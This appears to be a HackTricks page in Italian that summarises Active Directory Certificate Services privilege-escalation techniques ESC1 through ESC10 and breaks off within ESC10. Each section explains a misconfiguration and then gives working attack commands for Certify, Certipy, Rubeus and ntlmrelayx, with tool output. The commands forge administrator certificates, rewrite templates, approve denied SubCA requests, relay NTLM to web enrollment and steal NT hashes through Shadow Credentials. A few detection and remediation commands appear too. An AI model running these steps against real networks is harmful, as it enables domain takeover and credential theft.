# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}

**Questo è un riepilogo delle sezioni delle tecniche di escalation dei post:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Modelli di Certificato Malconfigurati - ESC1

### Spiegazione

### Modelli di Certificato Malconfigurati - ESC1 Spiegato

- **I diritti di iscrizione sono concessi a utenti a bassa privilegio da parte dell'Enterprise CA.**
- **L'approvazione del manager non è necessaria.**
- **Non sono necessarie firme da parte del personale autorizzato.**
- **I descrittori di sicurezza sui modelli di certificato sono eccessivamente permissivi, consentendo agli utenti a bassa privilegio di ottenere diritti di iscrizione.**
- **I modelli di certificato sono configurati per definire EKU che facilitano l'autenticazione:**
- Identificatori di Extended Key Usage (EKU) come Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), o nessun EKU (SubCA) sono inclusi.
- **La possibilità per i richiedenti di includere un subjectAltName nella Certificate Signing Request (CSR) è consentita dal modello:**
- L'Active Directory (AD) dà priorità al subjectAltName (SAN) in un certificato per la verifica dell'identità se presente. Ciò significa che specificando il SAN in una CSR, è possibile richiedere un certificato per impersonare qualsiasi utente (ad es., un amministratore di dominio). Se un SAN può essere specificato dal richiedente è indicato nell'oggetto AD del modello di certificato attraverso la proprietà `mspki-certificate-name-flag`. Questa proprietà è una bitmask, e la presenza del flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` consente la specifica del SAN da parte del richiedente.

> [!CAUTION]
> La configurazione delineata consente agli utenti a bassa privilegio di richiedere certificati con qualsiasi SAN a scelta, abilitando l'autenticazione come qualsiasi principale di dominio tramite Kerberos o SChannel.

Questa funzionalità è talvolta abilitata per supportare la generazione al volo di certificati HTTPS o di host da parte di prodotti o servizi di distribuzione, o a causa di una mancanza di comprensione.

Si nota che la creazione di un certificato con questa opzione attiva un avviso, il che non avviene quando un modello di certificato esistente (come il modello `WebServer`, che ha `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` abilitato) viene duplicato e poi modificato per includere un OID di autenticazione.

### Abuso

Per **trovare modelli di certificato vulnerabili** puoi eseguire:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Per **sfruttare questa vulnerabilità per impersonare un amministratore** si potrebbe eseguire:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Puoi quindi trasformare il **certificato generato in formato `.pfx`** e usarlo per **autenticarti utilizzando Rubeus o certipy** di nuovo:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
I file binari di Windows "Certreq.exe" e "Certutil.exe" possono essere utilizzati per generare il PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L'enumerazione dei modelli di certificato all'interno dello schema di configurazione della foresta AD, specificamente quelli che non richiedono approvazione o firme, che possiedono un EKU di Autenticazione Client o Accesso con Smart Card, e con il flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` abilitato, può essere eseguita eseguendo la seguente query LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modelli di Certificati Mal Configurati - ESC2

### Spiegazione

Il secondo scenario di abuso è una variazione del primo:

1. I diritti di registrazione sono concessi a utenti a basso privilegio da parte dell'Enterprise CA.
2. Il requisito di approvazione del manager è disabilitato.
3. La necessità di firme autorizzate è omessa.
4. Un descrittore di sicurezza eccessivamente permissivo sul modello di certificato concede diritti di registrazione del certificato a utenti a basso privilegio.
5. **Il modello di certificato è definito per includere l'Any Purpose EKU o nessun EKU.**

L'**Any Purpose EKU** consente a un certificato di essere ottenuto da un attaccante per **qualsiasi scopo**, inclusa l'autenticazione del client, l'autenticazione del server, la firma del codice, ecc. La stessa **tecnica utilizzata per ESC3** può essere impiegata per sfruttare questo scenario.

I certificati con **nessun EKU**, che fungono da certificati CA subordinati, possono essere sfruttati per **qualsiasi scopo** e possono **anche essere utilizzati per firmare nuovi certificati**. Pertanto, un attaccante potrebbe specificare EKU o campi arbitrari nei nuovi certificati utilizzando un certificato CA subordinato.

Tuttavia, i nuovi certificati creati per **l'autenticazione del dominio** non funzioneranno se la CA subordinata non è fidata dall'oggetto **`NTAuthCertificates`**, che è l'impostazione predefinita. Tuttavia, un attaccante può comunque creare **nuovi certificati con qualsiasi EKU** e valori di certificato arbitrari. Questi potrebbero essere potenzialmente **abusati** per una vasta gamma di scopi (ad es., firma del codice, autenticazione del server, ecc.) e potrebbero avere implicazioni significative per altre applicazioni nella rete come SAML, AD FS o IPSec.

Per enumerare i modelli che corrispondono a questo scenario all'interno dello schema di configurazione dell'AD Forest, può essere eseguita la seguente query LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modelli di Agente di Registrazione Malconfigurati - ESC3

### Spiegazione

Questo scenario è simile al primo e al secondo, ma **abusa** di un **EKU** (Agente di Richiesta di Certificato) **diverso** e **2 modelli** diversi (pertanto ha 2 set di requisiti),

L'**EKU di Richiesta di Certificato** (OID 1.3.6.1.4.1.311.20.2.1), noto come **Agente di Registrazione** nella documentazione Microsoft, consente a un principale di **registrarsi** per un **certificato** per **conto di un altro utente**.

L'**“agente di registrazione”** si registra in un **modello** e utilizza il **certificato risultante per co-firmare un CSR per conto dell'altro utente**. Poi **invia** il **CSR co-firmato** all'CA, registrandosi in un **modello** che **permette “registrarsi per conto di”**, e l'CA risponde con un **certificato appartenente all'“altro” utente**.

**Requisiti 1:**

- I diritti di registrazione sono concessi a utenti a basso privilegio dall'Enterprise CA.
- Il requisito per l'approvazione del manager è omesso.
- Nessun requisito per firme autorizzate.
- Il descrittore di sicurezza del modello di certificato è eccessivamente permissivo, concedendo diritti di registrazione a utenti a basso privilegio.
- Il modello di certificato include l'EKU di Richiesta di Certificato, consentendo la richiesta di altri modelli di certificato per conto di altri principali.

**Requisiti 2:**

- L'Enterprise CA concede diritti di registrazione a utenti a basso privilegio.
- L'approvazione del manager è elusa.
- La versione dello schema del modello è 1 o supera 2, e specifica un Requisito di Emissione di Politica Applicativa che richiede l'EKU di Richiesta di Certificato.
- Un EKU definito nel modello di certificato consente l'autenticazione del dominio.
- Le restrizioni per gli agenti di registrazione non sono applicate sull'CA.

### Abuso

Puoi utilizzare [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) per abusare di questo scenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Gli **utenti** che sono autorizzati a **ottenere** un **certificato di agente di registrazione**, i modelli nei quali gli **agenti** di registrazione sono autorizzati a registrarsi e gli **account** per conto dei quali l'agente di registrazione può agire possono essere limitati dalle CA aziendali. Questo si ottiene aprendo il `certsrc.msc` **snap-in**, **facendo clic con il tasto destro sulla CA**, **cliccando su Proprietà**, e poi **navigando** alla scheda “Agenti di registrazione”.

Tuttavia, si nota che l'impostazione **predefinita** per le CA è di “**Non limitare gli agenti di registrazione**.” Quando la restrizione sugli agenti di registrazione è abilitata dagli amministratori, impostandola su “Limitare gli agenti di registrazione,” la configurazione predefinita rimane estremamente permissiva. Consente l'accesso a **Tutti** per registrarsi in tutti i modelli come chiunque.

## Controllo degli accessi ai modelli di certificato vulnerabili - ESC4

### **Spiegazione**

Il **descrittore di sicurezza** sui **modelli di certificato** definisce le **autorizzazioni** specifiche che i **principali AD** possiedono riguardo al modello.

Se un **attaccante** possiede le necessarie **autorizzazioni** per **modificare** un **modello** e **istituire** eventuali **misconfigurazioni sfruttabili** delineate nelle **sezioni precedenti**, l'escalation dei privilegi potrebbe essere facilitata.

Le autorizzazioni note applicabili ai modelli di certificato includono:

- **Proprietario:** Concede il controllo implicito sull'oggetto, consentendo la modifica di qualsiasi attributo.
- **FullControl:** Abilita l'autorità completa sull'oggetto, inclusa la capacità di modificare qualsiasi attributo.
- **WriteOwner:** Permette la modifica del proprietario dell'oggetto a un principale sotto il controllo dell'attaccante.
- **WriteDacl:** Consente la regolazione dei controlli di accesso, potenzialmente concedendo a un attaccante FullControl.
- **WriteProperty:** Autorizza la modifica di qualsiasi proprietà dell'oggetto.

### Abuso

Un esempio di privesc come il precedente:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 è quando un utente ha privilegi di scrittura su un modello di certificato. Questo può essere abusato, ad esempio, per sovrascrivere la configurazione del modello di certificato per renderlo vulnerabile a ESC1.

Come possiamo vedere nel percorso sopra, solo `JOHNPC` ha questi privilegi, ma il nostro utente `JOHN` ha il nuovo `AddKeyCredentialLink` edge a `JOHNPC`. Poiché questa tecnica è correlata ai certificati, ho implementato anche questo attacco, noto come [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Ecco un piccolo assaggio del comando `shadow auto` di Certipy per recuperare l'hash NT della vittima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** può sovrascrivere la configurazione di un modello di certificato con un singolo comando. Per **default**, Certipy **sovrascriverà** la configurazione per renderla **vulnerabile a ESC1**. Possiamo anche specificare il **`-save-old` parametro per salvare la vecchia configurazione**, che sarà utile per **ripristinare** la configurazione dopo il nostro attacco.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Controllo degli Accessi agli Oggetti PKI Vulnerabili - ESC5

### Spiegazione

La vasta rete di relazioni interconnesse basate su ACL, che include diversi oggetti oltre ai modelli di certificato e all'autorità di certificazione, può influenzare la sicurezza dell'intero sistema AD CS. Questi oggetti, che possono influenzare significativamente la sicurezza, comprendono:

- L'oggetto computer AD del server CA, che può essere compromesso attraverso meccanismi come S4U2Self o S4U2Proxy.
- Il server RPC/DCOM del server CA.
- Qualsiasi oggetto o contenitore AD discendente all'interno del percorso specifico `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Questo percorso include, ma non è limitato a, contenitori e oggetti come il contenitore dei Modelli di Certificato, il contenitore delle Autorità di Certificazione, l'oggetto NTAuthCertificates e il Contenitore dei Servizi di Registrazione.

La sicurezza del sistema PKI può essere compromessa se un attaccante a basso privilegio riesce a ottenere il controllo su uno di questi componenti critici.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Spiegazione

L'argomento discusso nel [**post di CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) tocca anche le implicazioni del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, come delineato da Microsoft. Questa configurazione, quando attivata su un'Autorità di Certificazione (CA), consente l'inclusione di **valori definiti dall'utente** nel **nome alternativo del soggetto** per **qualsiasi richiesta**, comprese quelle costruite da Active Directory®. Di conseguenza, questa disposizione consente a un **intruso** di registrarsi attraverso **qualsiasi modello** impostato per l'**autenticazione** del dominio—specificamente quelli aperti alla registrazione di utenti **non privilegiati**, come il modello standard Utente. Di conseguenza, un certificato può essere ottenuto, consentendo all'intruso di autenticarsi come amministratore di dominio o **qualsiasi altra entità attiva** all'interno del dominio.

**Nota**: L'approccio per aggiungere **nomi alternativi** in una Richiesta di Firma del Certificato (CSR), attraverso l'argomento `-attrib "SAN:"` in `certreq.exe` (definito come “Name Value Pairs”), presenta un **contrasto** rispetto alla strategia di sfruttamento degli SAN in ESC1. Qui, la distinzione risiede in **come le informazioni sull'account sono incapsulate**—all'interno di un attributo del certificato, piuttosto che in un'estensione.

### Abuso

Per verificare se l'impostazione è attivata, le organizzazioni possono utilizzare il seguente comando con `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Questa operazione utilizza essenzialmente **l'accesso al registro remoto**, quindi, un approccio alternativo potrebbe essere:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Strumenti come [**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) sono in grado di rilevare questa misconfigurazione e sfruttarla:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Per modificare queste impostazioni, assumendo di possedere diritti **amministrativi di dominio** o equivalenti, il seguente comando può essere eseguito da qualsiasi workstation:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Per disabilitare questa configurazione nel tuo ambiente, il flag può essere rimosso con:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Dopo gli aggiornamenti di sicurezza di maggio 2022, i **certificati** emessi di recente conterranno un **estensione di sicurezza** che incorpora la **proprietà `objectSid` del richiedente**. Per ESC1, questo SID è derivato dal SAN specificato. Tuttavia, per **ESC6**, il SID rispecchia il **`objectSid` del richiedente**, non il SAN.\
> Per sfruttare ESC6, è essenziale che il sistema sia suscettibile a ESC10 (Mappature di Certificati Deboli), che dà priorità al **SAN rispetto alla nuova estensione di sicurezza**.

## Controllo degli Accessi dell'Autorità di Certificazione Vulnerabile - ESC7

### Attacco 1

#### Spiegazione

Il controllo degli accessi per un'autorità di certificazione è mantenuto attraverso un insieme di permessi che governano le azioni della CA. Questi permessi possono essere visualizzati accedendo a `certsrv.msc`, facendo clic destro su una CA, selezionando proprietà e poi navigando alla scheda Sicurezza. Inoltre, i permessi possono essere enumerati utilizzando il modulo PSPKI con comandi come:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Questo fornisce informazioni sui diritti principali, ovvero **`ManageCA`** e **`ManageCertificates`**, correlati ai ruoli di “amministratore CA” e “gestore certificati” rispettivamente.

#### Abuso

Avere diritti **`ManageCA`** su un'autorità di certificazione consente al principale di manipolare le impostazioni da remoto utilizzando PSPKI. Questo include l'attivazione del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** per consentire la specifica SAN in qualsiasi modello, un aspetto critico dell'escalation del dominio.

La semplificazione di questo processo è realizzabile attraverso l'uso del cmdlet **Enable-PolicyModuleFlag** di PSPKI, che consente modifiche senza interazione diretta con l'interfaccia grafica.

Il possesso di diritti **`ManageCertificates`** facilita l'approvazione delle richieste in sospeso, eludendo efficacemente la protezione "approvazione del gestore certificati CA".

Una combinazione dei moduli **Certify** e **PSPKI** può essere utilizzata per richiedere, approvare e scaricare un certificato:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attacco 2

#### Spiegazione

> [!WARNING]
> Nell'**attacco precedente** i permessi **`Manage CA`** sono stati utilizzati per **abilitare** il flag **EDITF_ATTRIBUTESUBJECTALTNAME2** per eseguire l'**attacco ESC6**, ma questo non avrà alcun effetto fino a quando il servizio CA (`CertSvc`) non verrà riavviato. Quando un utente ha il diritto di accesso **`Manage CA`**, l'utente è anche autorizzato a **riavviare il servizio**. Tuttavia, **non significa che l'utente possa riavviare il servizio da remoto**. Inoltre, l'**ESC6 potrebbe non funzionare immediatamente** nella maggior parte degli ambienti patchati a causa degli aggiornamenti di sicurezza di maggio 2022.

Pertanto, un altro attacco è presentato qui.

Prerequisiti:

- Solo permesso **`ManageCA`**
- Permesso **`Manage Certificates`** (può essere concesso da **`ManageCA`**)
- Il modello di certificato **`SubCA`** deve essere **abilitato** (può essere abilitato da **`ManageCA`**)

La tecnica si basa sul fatto che gli utenti con il diritto di accesso **`Manage CA`** _e_ **`Manage Certificates`** possono **emettere richieste di certificato fallite**. Il modello di certificato **`SubCA`** è **vulnerabile a ESC1**, ma **solo gli amministratori** possono iscriversi al modello. Pertanto, un **utente** può **richiedere** di iscriversi al **`SubCA`** - che sarà **negata** - ma **poi emessa dal manager successivamente**.

#### Abuso

Puoi **concederti il diritto di accesso `Manage Certificates`** aggiungendo il tuo utente come nuovo ufficiale.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Il template **`SubCA`** può essere **abilitato sulla CA** con il parametro `-enable-template`. Per impostazione predefinita, il template `SubCA` è abilitato.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Se abbiamo soddisfatto i prerequisiti per questo attacco, possiamo iniziare **richiedendo un certificato basato sul modello `SubCA`**.

**Questa richiesta verrà negata**, ma salveremo la chiave privata e annoteremo l'ID della richiesta.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Con il nostro **`Manage CA` e `Manage Certificates`**, possiamo quindi **emettere la richiesta di certificato fallita** con il comando `ca` e il parametro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
E infine, possiamo **recuperare il certificato emesso** con il comando `req` e il parametro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Spiegazione

> [!NOTE]
> In ambienti in cui **AD CS è installato**, se esiste un **endpoint di registrazione web vulnerabile** e almeno un **modello di certificato è pubblicato** che consente **l'iscrizione di computer di dominio e l'autenticazione dei client** (come il modello predefinito **`Machine`**), diventa possibile per **qualsiasi computer con il servizio spooler attivo essere compromesso da un attaccante**!

Diversi **metodi di registrazione basati su HTTP** sono supportati da AD CS, resi disponibili attraverso ruoli server aggiuntivi che gli amministratori possono installare. Queste interfacce per la registrazione di certificati basata su HTTP sono suscettibili a **attacchi di relay NTLM**. Un attaccante, da una **macchina compromessa, può impersonare qualsiasi account AD che si autentica tramite NTLM in entrata**. Mentre impersona l'account vittima, queste interfacce web possono essere accessibili da un attaccante per **richiedere un certificato di autenticazione client utilizzando i modelli di certificato `User` o `Machine`**.

- L'**interfaccia di registrazione web** (un'applicazione ASP più vecchia disponibile su `http://<caserver>/certsrv/`), per impostazione predefinita utilizza solo HTTP, che non offre protezione contro gli attacchi di relay NTLM. Inoltre, consente esplicitamente solo l'autenticazione NTLM attraverso il suo header HTTP di autorizzazione, rendendo inapplicabili metodi di autenticazione più sicuri come Kerberos.
- Il **Certificate Enrollment Service** (CES), il **Certificate Enrollment Policy** (CEP) Web Service e il **Network Device Enrollment Service** (NDES) supportano per impostazione predefinita l'autenticazione negotiate tramite il loro header HTTP di autorizzazione. L'autenticazione negotiate **supporta sia** Kerberos che **NTLM**, consentendo a un attaccante di **downgradare all'autenticazione NTLM** durante gli attacchi di relay. Sebbene questi servizi web abilitino HTTPS per impostazione predefinita, HTTPS da solo **non protegge dagli attacchi di relay NTLM**. La protezione dagli attacchi di relay NTLM per i servizi HTTPS è possibile solo quando HTTPS è combinato con il binding del canale. Sfortunatamente, AD CS non attiva la Protezione Estesa per l'Autenticazione su IIS, che è necessaria per il binding del canale.

Un comune **problema** con gli attacchi di relay NTLM è la **breve durata delle sessioni NTLM** e l'incapacità dell'attaccante di interagire con i servizi che **richiedono la firma NTLM**.

Tuttavia, questa limitazione è superata sfruttando un attacco di relay NTLM per acquisire un certificato per l'utente, poiché il periodo di validità del certificato determina la durata della sessione, e il certificato può essere utilizzato con servizi che **richiedono la firma NTLM**. Per istruzioni su come utilizzare un certificato rubato, fare riferimento a:

{{#ref}}
account-persistence.md
{{#endref}}

Un'altra limitazione degli attacchi di relay NTLM è che **una macchina controllata dall'attaccante deve essere autenticata da un account vittima**. L'attaccante potrebbe aspettare o tentare di **forzare** questa autenticazione:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumera **endpoint HTTP AD CS abilitati**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La proprietà `msPKI-Enrollment-Servers` è utilizzata dalle Autorità di Certificazione (CA) aziendali per memorizzare i punti finali del Servizio di Registrazione dei Certificati (CES). Questi punti finali possono essere analizzati e elencati utilizzando lo strumento **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso con Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso con [Certipy](https://github.com/ly4k/Certipy)

La richiesta per un certificato viene effettuata da Certipy per impostazione predefinita in base al modello `Machine` o `User`, determinato dal fatto che il nome dell'account da relazionare termini con `$`. La specifica di un modello alternativo può essere ottenuta attraverso l'uso del parametro `-template`.

Una tecnica come [PetitPotam](https://github.com/ly4k/PetitPotam) può quindi essere impiegata per costringere l'autenticazione. Quando si tratta di controller di dominio, è necessaria la specifica di `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Spiegazione

Il nuovo valore **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) per **`msPKI-Enrollment-Flag`**, noto come ESC9, impedisce l'inserimento della **nuova estensione di sicurezza `szOID_NTDS_CA_SECURITY_EXT`** in un certificato. Questo flag diventa rilevante quando `StrongCertificateBindingEnforcement` è impostato su `1` (l'impostazione predefinita), in contrasto con un'impostazione di `2`. La sua rilevanza aumenta in scenari in cui una mappatura del certificato più debole per Kerberos o Schannel potrebbe essere sfruttata (come in ESC10), dato che l'assenza di ESC9 non altererebbe i requisiti.

Le condizioni in cui l'impostazione di questo flag diventa significativa includono:

- `StrongCertificateBindingEnforcement` non è regolato su `2` (con il predefinito che è `1`), o `CertificateMappingMethods` include il flag `UPN`.
- Il certificato è contrassegnato con il flag `CT_FLAG_NO_SECURITY_EXTENSION` all'interno dell'impostazione `msPKI-Enrollment-Flag`.
- Qualsiasi EKU di autenticazione del client è specificata dal certificato.
- I permessi `GenericWrite` sono disponibili su qualsiasi account per compromettere un altro.

### Scenario di Abuso

Supponiamo che `John@corp.local` detenga permessi `GenericWrite` su `Jane@corp.local`, con l'obiettivo di compromettere `Administrator@corp.local`. Il modello di certificato `ESC9`, a cui `Jane@corp.local` è autorizzata a iscriversi, è configurato con il flag `CT_FLAG_NO_SECURITY_EXTENSION` nella sua impostazione `msPKI-Enrollment-Flag`.

Inizialmente, l'hash di `Jane` viene acquisito utilizzando Shadow Credentials, grazie a `John`'s `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Successivamente, il `userPrincipalName` di `Jane` viene modificato in `Administrator`, omettendo volutamente la parte del dominio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Questa modifica non viola i vincoli, dato che `Administrator@corp.local` rimane distinto come `userPrincipalName` di `Administrator`.

Dopo ciò, il modello di certificato `ESC9`, contrassegnato come vulnerabile, viene richiesto come `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Si nota che il `userPrincipalName` del certificato riflette `Administrator`, privo di qualsiasi “object SID”.

Il `userPrincipalName` di `Jane` viene quindi ripristinato al suo originale, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Tentare l'autenticazione con il certificato emesso ora restituisce l'hash NT di `Administrator@corp.local`. Il comando deve includere `-domain <domain>` a causa della mancanza di specifica del dominio nel certificato:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Mappature di Certificati Deboli - ESC10

### Spiegazione

Due valori di chiave di registro sul controller di dominio sono indicati da ESC10:

- Il valore predefinito per `CertificateMappingMethods` sotto `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` è `0x18` (`0x8 | 0x10`), precedentemente impostato su `0x1F`.
- L'impostazione predefinita per `StrongCertificateBindingEnforcement` sotto `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` è `1`, precedentemente `0`.

**Caso 1**

Quando `StrongCertificateBindingEnforcement` è configurato come `0`.

**Caso 2**

Se `CertificateMappingMethods` include il bit `UPN` (`0x4`).

### Caso di Abuso 1

Con `StrongCertificateBindingEnforcement` configurato come `0`, un account A con permessi `GenericWrite` può essere sfruttato per compromettere qualsiasi account B.

Ad esempio, avendo permessi `GenericWrite` su `Jane@corp.local`, un attaccante mira a compromettere `Administrator@corp.local`. La procedura rispecchia ESC9, consentendo di utilizzare qualsiasi modello di certificato.

Inizialmente, l'hash di `Jane` viene recuperato utilizzando Shadow Credentials, sfruttando il `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
